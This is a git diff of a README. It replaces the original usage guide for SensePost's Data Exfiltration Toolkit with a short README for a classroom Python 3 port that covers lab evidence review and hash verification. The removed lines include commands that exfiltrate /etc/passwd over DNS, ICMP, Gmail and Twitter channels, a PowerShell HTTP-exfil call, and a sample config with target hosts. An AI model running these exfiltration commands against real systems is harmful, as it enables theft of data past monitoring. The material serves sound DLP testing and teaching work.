@@ -1,222 +1,45 @@
-DET (extensible) Data Exfiltration Toolkit
-=======
+# Data Exfiltration Toolkit (DET) — Python 3 Port
 
-DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time.  
+A Python 3 port of SensePost’s Data Exfiltration Toolkit, prepared for a university cyber forensics project. The upstream version was written for Python 2 and used outdated dependencies. This port updates the code and dependencies for Python 3.
 
-**This is a Proof of Concept aimed at identifying possible DLP failures. This should never be used to exfiltrate sensitive/live data (say on an assessment)**
+## Purpose
 
-The idea was to create a generic toolkit to plug any kind of protocol/service to test implmented Network Monitoring and Data Leakage Prevention (DLP) solutions configuration, against different data exfiltration techniques.
+DET was developed as a proof of concept for evaluating data loss prevention (DLP) controls. Our class project used it to study file recovery and compare endpoint evidence with what an analyst can observe in Wireshark.
 
-The primary repository has now moved to [here](https://github.com/PaulSec/DET).
+## Compatibility
 
-# Slides
+| Component | Status |
+| --- | --- |
+| Python 3 | Port used for the classroom project |
+| HTTP plugin | Worked in the local classroom lab. The recovered file matched the original byte for byte. |
+| Other plugins | Included from upstream. End-to-end compatibility is unverified. |
 
-DET has been presented at [BSides Ljubljana](https://bsidesljubljana.si/) on the 9th of March 2016 and the slides will be available here.
-Slides are available [here](https://docs.google.com/presentation/d/11uk6d-xougn3jU1wu4XRM3ZGzitobScSSMUlx0MRTzg).
+## Repository layout
 
-# Example usage (ICMP plugin)
+| Path | Purpose |
+| --- | --- |
+| `det.py` | Main Python 3 application |
+| `plugins/` | Transport plugins |
+| `requirements.txt` | Python dependencies |
+| `config-sample.json` | Upstream configuration reference |
 
-## Server-side: 
+Keep local configurations, credentials, captured traffic, and recovered files out of version control.
 
-[![asciicast](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv.png)](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv)
+## Reviewing lab evidence
 
-## Client-side: 
+Open a saved capture from your authorized lab in Wireshark. Identify the endpoints, apply a display filter for the observed protocol, and inspect a relevant frame. Record what you can see, such as timestamps, packet lengths, and protocol headers. Label any separate plaintext comparison capture so readers can identify its source.
 
-[![asciicast](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl.png)](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl)
+To verify recovery on Linux, set `original_file` and `recovered_file` to the paths of the two files, then run:
 
+    sha256sum -- "$original_file" "$recovered_file"
+    cmp -- "$original_file" "$recovered_file"
 
-# Usage while combining two channels (Gmail/Twitter)
+Matching SHA-256 hashes support the recovery finding. `cmp` exits with status `0` when both files contain exactly the same bytes.
 
-## Server-side: 
+## Credits and license
 
-[![asciicast](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj.png)](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj)
+Original project by [SensePost](https://github.com/sensepost/DET). Copyright (c) 2016 SensePost. The upstream project is licensed under the MIT License. See `LICENSE` for the full text.
 
-## Client-side: 
+## Responsible use
 
-[![asciicast](https://asciinema.org/a/bfstssgptxd41ncces4981cn6.png)](https://asciinema.org/a/bfstssgptxd41ncces4981cn6)
-
-
-# Installation
-
-Clone the repo: 
-
-```bash
-git clone https://github.com/sensepost/DET.git
-```
-
-Then: 
-
-```bash
-pip install -r requirements.txt --user
-```
-
-# Configuration
-
-In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP, AES256 encryption
-passphrase and so on). A configuration example file has been provided and is called: ```config-sample.json```
-
-```json
-{
-    "plugins": {
-        "http": {
-            "target": "192.168.1.101",
-            "port": 8080
-        },
-        "google_docs": {
-            "target": "192.168.1.101",
-            "port": 8080,
-        },
-        "dns": {
-            "key": "google.com",
-            "target": "192.168.1.101",
-            "port": 53
-        },
-        "gmail": {
-            "username": "dataexfil@gmail.com",
-            "password": "ReallyStrongPassword",
-            "server": "smtp.gmail.com",
-            "port": 587
-        },
-        "tcp": {
-            "target": "192.168.1.101",
-            "port": 6969
-        },
-        "udp": {
-            "target": "192.168.1.101",
-            "port": 6969
-        },
-        "twitter": {
-            "username": "PaulWebSec",
-            "CONSUMER_TOKEN": "XXXXXXXXX",
-            "CONSUMER_SECRET": "XXXXXXXXX",
-            "ACCESS_TOKEN": "XXXXXXXXX",
-            "ACCESS_TOKEN_SECRET": "XXXXXXXXX"
-        },
-        "icmp": {
-            "target": "192.168.1.101"
-        }
-    },
-    "AES_KEY": "THISISACRAZYKEY",
-    "sleep_time": 10
-}
-```
-
-# Usage
-
-## Help usage
-
-```bash
-python det.py -h
-usage: det.py [-h] [-c CONFIG] [-f FILE] [-d FOLDER] [-p PLUGIN] [-e EXCLUDE]
-              [-L]
-
-Data Exfiltration Toolkit (SensePost)
-
-optional arguments:
-  -h, --help  show this help message and exit
-  -c CONFIG   Configuration file (eg. '-c ./config-sample.json')
-  -f FILE     File to exfiltrate (eg. '-f /etc/passwd')
-  -d FOLDER   Folder to exfiltrate (eg. '-d /etc/')
-  -p PLUGIN   Plugins to use (eg. '-p dns,twitter')
-  -e EXCLUDE  Plugins to exclude (eg. '-e gmail,icmp')
-  -L          Server mode
-```
-
-## Server-side: 
-
-To load every plugin:
-
-```bash
-python det.py -L -c ./config.json
-```
-
-To load *only* twitter and gmail modules: 
-
-```bash
-python det.py -L -c ./config.json -p twitter,gmail
-```
-
-To load every plugin and exclude DNS: 
-
-```bash
-python det.py -L -c ./config.json -e dns
-```
-
-## Client-side:
-
-To load every plugin: 
-
-```bash
-python det.py -c ./config.json -f /etc/passwd
-```
-
-To load *only* twitter and gmail modules: 
-
-```bash
-python det.py -c ./config.json -p twitter,gmail -f /etc/passwd
-```
-
-To load every plugin and exclude DNS: 
-
-```bash
-python det.py -c ./config.json -e dns -f /etc/passwd
-```
-And in PowerShell (HTTP module): 
-
-```powershell
-PS C:\Users\user01\Desktop>
-PS C:\Users\user01\Desktop> . .\http_exfil.ps1
-PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
-```
-
-# Modules
-
-So far, DET supports multiple protocols, listed here: 
-
-- [X] HTTP(S)
-- [X] ICMP
-- [X] DNS
-- [X] SMTP/IMAP (eg. Gmail)
-- [X] Raw TCP
-- [X] PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))
-
-And other "services": 
-
-- [X] Google Docs (Unauthenticated)
-- [X] Twitter (Direct Messages)
-
-# Experimental modules
-
-So far, I am busy implementing new modules which are almost ready to ship, including: 
-
-- [ ] Skype (95% done)
-- [ ] Tor (80% done)
-- [ ] Github (30/40% done)
-
-# Roadmap
-
-- [X] Add proper encryption (eg. AES-256) Thanks to [ryanohoro](https://github.com/ryanohoro)
-- [X] Compression (extremely important!) Thanks to [chokepoint](https://github.com/chokepoint)
-- [ ] Proper data obfuscation and integrating [Cloakify Toolset Toolset](https://github.com/trycatchhcf/cloakify)
-- [ ] FTP, FlickR [LSB Steganography](https://github.com/RobinDavid/LSB-Steganography) and Youtube modules
-
-# References
-
-Some pretty cool references/credits to people I got inspired by with their project: 
-
-- [https://github.com/nullbind/Powershellery/](Powershellery) from Nullbind.
-- [https://github.com/ytisf/PyExfil](PyExfil), truely awesome. 
-- [https://github.com/m57/dnsteal](dnsteal) from m57.
-- [https://github.com/3nc0d3r/NaishoDeNusumu](NaishoDeNusumu) from 3nc0d3r.
-- [https://github.com/glennzw/exphil](Exphil) from Glenn Wilkinson.
-- WebExfile from Saif El-Sherei
-
-# Contact/Contributing
-
-You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec). 
-Feel free if you want to contribute, clone, fork, submit your PR and so on.
-
-# License
-
-DET is licensed under a [MIT License](https://opensource.org/licenses/MIT). 
-Permissions beyond the scope of this license may be available at [info@sensepost.com](info@sensepost.com)
+Use this project only for education, defensive research, or security testing on systems and networks you own or have explicit permission to test. Do not use it for malicious purposes or unauthorized data transfers. Use non-sensitive test files in classroom labs.
